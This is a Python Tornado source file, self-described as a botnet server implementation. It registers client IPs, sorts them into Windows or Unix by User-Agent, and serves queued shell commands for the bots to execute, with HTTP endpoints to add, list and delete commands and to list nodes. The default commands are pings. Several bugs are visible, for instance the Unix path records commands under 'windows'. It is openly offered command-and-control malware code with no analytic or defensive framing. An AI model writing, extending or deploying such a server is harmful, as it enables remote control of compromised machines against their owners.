'''
    This is a botnet server implementation.

    Missing:
        a) CommandsService.get_commands implementation
'''


import tornado.ioloop
import tornado.web

import tornado.options
from tornado.options import options, define
import httpagentparser
import json
import time
import os


define('debug', default=True, help="debug mode", type=bool)


class ClientCache:
    def __init__(self):
        self.nodes = {}

    def add_node(self, clientIp):
        if clientIp not in self.nodes:
            self.nodes[clientIp] = {
                'last_seen': int(time.time()),
                'windows': [],
                'unix': [],
            }
        else:
            self.nodes[clientIp]['last_seen'] = int(time.time())

    def commands_to_execute(self, clientIp, commands, os='unix'):
        """
        Returns which commands to execute, skips commands which were already executed once
        """

        to_execute = []
        for key, comm in commands.items():
            if key not in self.nodes[clientIp][os]:
                self.nodes[clientIp][os].append(key)
                to_execute.append(comm)
        return to_execute

    def clean_up_expired(self):
        nodes_to_delete = []
        for key, values in self.nodes.items():
            if int(time.time()) - values['last_seen'] > 3600:
                nodes_to_delete.append(key)

        for node in nodes_to_delete:
            del nodes_to_delete[node]


class MainHandler(tornado.web.RequestHandler):
    """
    """
    def get(self):
        self.render('index.html')


class NodesHandler(tornado.web.RequestHandler):
    """
    """
    def get(self):
        key = self.get_argument('key', '')
        if key:
            self.write(json.dumps(self.application.clients_cache.nodes.get(key, {})))
        self.write(json.dumps(self.application.clients_cache.nodes))


class CommandHandler(tornado.web.RequestHandler):
    """
    """
    def get(self):
        # list method
        self.write(json.dumps(self.application.commands, ensure_ascii=False))

    def post(self):
        # add method
        key = self.get_argument('key', '')
        sys_os = self.get_argument('os', 'unix')
        command = self.get_argument('command', '')
        if sys_os in ['windows', 'unix']:
            self.application.commands[sys_os][key] = command
        else:
            self.set_status(400)

    def delete(self):
        # delete method
        key = self.get_argument('key', '')
        if key in self.application.commands:
            del self.application.commands[key]
        else:
            self.set_status(404)



class BotnetCommandsController(tornado.web.RequestHandler):
    def get(self):
        headers = self.request.headers
        print(headers)
        clientIp = self.request.remote_ip
        self.application.clients_cache.add_node(clientIp)

        if 'windows' in headers.get('User-Agent', '').lower():
            commands = self.application.commands['windows']
            re = self.application.clients_cache.commands_to_execute(clientIp,
                                                                    commands,
                                                                    'windows')
            self.write(' ; '.join(re))
        else:
            # unix system
            commands = self.application.commands['unix']
            re = self.application.clients_cache.commands_to_execute(clientIp,
                                                                    commands,
                                                                    'windows')
            self.write(' && '.join(re))

class Application(tornado.web.Application):
    """
    """
    def __init__(self):
        handlers = [
            (r"/commands", BotnetCommandsController),
            (r"/commands_management", CommandHandler),
            (r"/list_nodes", NodesHandler),
            (r"/.*", MainHandler),
            ]

        self.clients_cache = ClientCache()

        self.commands = dict(
            windows={
                'pingas': 'ping -n 2 google.com',
                'nepingas': 'ping -n 2 facebook.com'
            },
            unix={
                'pingas': 'ping -c 2 google.com',
                'nepingas': 'ping -c 2 facebook.com'
            })

        settings = dict(
            template_path=os.path.join(os.path.dirname(__file__), "files"),
            static_path=os.path.join(os.path.dirname(__file__), "files"),
            debug=options.debug,
        )

        super(Application, self).__init__(handlers, **settings)


if __name__ == "__main__":
    tornado.options.parse_command_line()
    app = Application()
    app.listen(8080)
    tornado.ioloop.IOLoop.current().start()
